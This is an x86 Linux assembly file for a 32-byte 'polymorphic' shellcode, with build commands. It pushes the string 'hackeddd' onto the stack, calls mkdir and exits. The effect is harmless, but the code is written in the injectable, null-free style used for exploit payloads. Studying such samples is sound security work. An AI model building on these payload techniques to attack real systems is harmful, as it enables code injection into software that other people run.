; Polymorphic mkdir 'hackeddd' - Linux x86 architecture
; Kiewicz (@_Kiewicz)
; GPL License
; 32 bytes
; $ nasm -f elf32 mkdir.asm -o mkdir.o
; $ ld -o mkdir mkdir.o
; $ ./mkdir
;

global _start
section .text
_start:

	cdq			        ; clear out EDX
	mov eax, edx		; set EAX = 0
	xor ecx, ecx		; clear out ECX
	push ecx		    ; push NULL byte, next string terminator
	push dword 0x64646465 	; ddde
	push dword 0x6b636168 	; kcah
	mov al,0x27 		; mkdir syscall = 39 (decimal)
	mov ebx, esp		; pointer to string
	mov cx, 0x1ed		; mode
	int 0x80 
	mov al,0x1 
	xor ebx,ebx 
	int 0x80 
